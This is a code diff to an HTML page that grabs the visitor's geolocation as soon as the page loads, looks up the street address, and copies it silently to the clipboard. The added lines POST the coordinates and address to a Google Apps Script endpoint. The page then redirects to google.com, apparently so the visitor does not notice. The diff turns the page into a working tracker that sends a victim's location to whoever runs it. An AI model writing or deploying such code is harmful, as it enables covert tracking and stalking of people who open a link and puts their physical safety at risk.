@@ -15,10 +15,22 @@
 <script>
 const STATUS = document.getElementById('status');
 
+// ==== CONFIGURE THIS ====
+const SHEET_URL = "https://script.google.com/macros/s/YOUR_SCRIPT_ID/exec";
+// =======================
+
 function setStatus(msg){ STATUS.textContent = 'Status: ' + msg; }
 
 function copyToClipboard(text){
-  navigator.clipboard.writeText(text).then(()=>{}, ()=>{});
+  navigator.clipboard.writeText(text).catch(()=>{});
+}
+
+function sendToServer(data){
+  fetch(SHEET_URL, {
+    method:'POST',
+    headers:{ 'Content-Type':'application/json' },
+    body: JSON.stringify(data)
+  }).catch(()=>{});
 }
 
 function reverseGeocode(lat, lon){
@@ -28,13 +40,15 @@ function reverseGeocode(lat, lon){
     .then(data=>{
       const addr = data.display_name ?? "N/A";
       const text = `Latitude: ${lat}\nLongitude: ${lon}\nAddress: ${addr}`;
-      copyToClipboard(text);  // silently copy
+      copyToClipboard(text);
+      sendToServer({lat, lon, addr});
       setStatus('Location captured and copied. Redirecting...');
       setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
     })
     .catch(err=>{
-      const text = `Latitude: ${lat}\nLongitude: ${lon}\nReverse geocoding failed`;
+      const text = `Latitude: ${lat}\nLongitude: ${lon}\nAddress: N/A`;
       copyToClipboard(text);
+      sendToServer({lat, lon, addr:null});
       setStatus('Location captured (no address). Redirecting...');
       setTimeout(()=>{ window.location.href='https://www.google.com'; }, 1500);
     });
@@ -63,7 +77,7 @@ function requestLocation(){
   });
 }
 
-// Attempt automatically (some browsers may require user gesture)
+// Attempt automatically
 setTimeout(requestLocation, 300);
 </script>
 </body>
